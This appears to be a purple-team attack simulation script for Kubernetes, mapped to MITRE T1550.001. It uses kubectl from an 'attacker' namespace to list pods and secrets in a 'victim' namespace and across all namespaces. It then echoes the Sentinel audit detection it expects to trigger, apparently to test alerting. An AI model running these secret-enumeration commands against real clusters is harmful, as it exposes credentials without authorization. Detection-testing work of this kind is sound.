#!/bin/bash
# ============================================================================
# Attack Simulation: Cross-Namespace Lateral Movement
# MITRE ATT&CK: T1550.001 - Application Access Token
# Run from: kubectl exec -it kubectl -n attacker -- /bin/sh
# ============================================================================

echo "[*] Current identity..."
kubectl auth whoami 2>/dev/null || kubectl get sa -n attacker

echo ""
echo "[*] Attempting to list resources in victim namespace..."
kubectl get pods -n victim
kubectl get secrets -n victim

echo ""
echo "[*] Attempting to list secrets across all namespaces..."
kubectl get secrets --all-namespaces

echo ""
echo "[*] Lateral movement attempt complete."
echo "[*] Expected Sentinel detection: AKSAudit cross-namespace token use"
echo "[*] Expected MITRE technique: T1550.001"
